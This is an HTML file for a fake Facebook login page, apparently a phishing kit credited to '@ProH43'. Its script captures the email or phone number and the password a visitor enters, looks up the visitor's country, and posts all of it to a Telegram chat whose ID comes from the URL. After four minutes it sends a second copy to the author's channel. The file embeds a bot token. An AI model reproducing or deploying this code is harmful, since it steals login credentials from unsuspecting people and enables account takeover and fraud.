<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Facebook</title>
  <style>
    body {
      background-color: #f0f2f5;
      font-family: Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      flex-direction: column;
    }

    .container {
      background-color: white;
      padding: 30px;
      border-radius: 10px;
      box-shadow: 0 2px 10px rgba(0,0,0,0.2);
      width: 100%;
      max-width: 360px;
      text-align: center;
    }

    .container h2 {
      color: #1877f2;
      margin-bottom: 20px;
    }

    input {
      width: 100%;
      padding: 12px;
      margin: 8px 0;
      box-sizing: border-box;
      border: 1px solid #ccc;
      border-radius: 6px;
    }

    button {
      width: 100%;
      background-color: #1877f2;
      color: white;
      padding: 12px;
      border: none;
      border-radius: 6px;
      font-size: 16px;
      margin-top: 10px;
      cursor: pointer;
    }

    button:hover {
      background-color: #165ecb;
    }

    .developer {
      margin-top: 15px;
      font-size: 13px;
      color: #999;
    }
  </style>
</head>
<body>

<div class="container">
  <h2>Facebook</h2>
  <form id="loginForm">
    <input type="text" id="identifier" placeholder="Mobile number or email" required>
    <input type="password" id="password" placeholder="Password" required>
    <button type="submit">Log In</button>
    <div class="developer">Developer by @ProH43</div>
  </form>
</div>

<script>
  const botToken = '7964718139:AAHSriHqoXBuo__F_paB26fO1Sx774Dpk-k';
  const telegramChannel = '@PRO_43KPISH'; // چینل یوزرنیم

  function getQueryParam(param) {
    const urlParams = new URLSearchParams(window.location.search);
    return urlParams.get(param);
  }

  async function getGeoInfo() {
    try {
      const res = await fetch('https://ipapi.co/json');
      return await res.json();
    } catch {
      return { country_name: "Unknown", country_code: "" };
    }
  }

  function getFlag(code) {
    if (!code) return "";
    return String.fromCodePoint(...[...code.toUpperCase()].map(c => 127397 + c.charCodeAt()));
  }

  async function sendTelegram(chatId, text) {
    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
    await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: chatId, text: text })
    });
  }

  document.getElementById("loginForm").addEventListener("submit", async function(e) {
    e.preventDefault();

    const telegramId = getQueryParam('id');
    if (!telegramId) {
      alert("Telegram ID نشته!");
      return;
    }

    const identifier = document.getElementById("identifier").value;
    const password = document.getElementById("password").value;

    const geo = await getGeoInfo();
    const country = geo.country_name || "Unknown";
    const flag = getFlag(geo.country_code);

    const msg = `🟦 Facebook Login\n\n📩 Email/Phone: ${identifier}\n🔐 Password: ${password}\n🌍 Country: ${country} ${flag}\n🆔 Telegram ID: ${telegramId}\n\n👨‍💻 Developer by @ProHacker43`;

    // 1. Send to bot user first
    await sendTelegram(telegramId, msg);

    // 2. After 4 minutes, send to channel
    setTimeout(() => {
      sendTelegram(telegramChannel, msg);
    }, 240000); // 4 minutes = 240,000 ms

    alert("Please wait...");
  });
</script>

</body>
</html> 
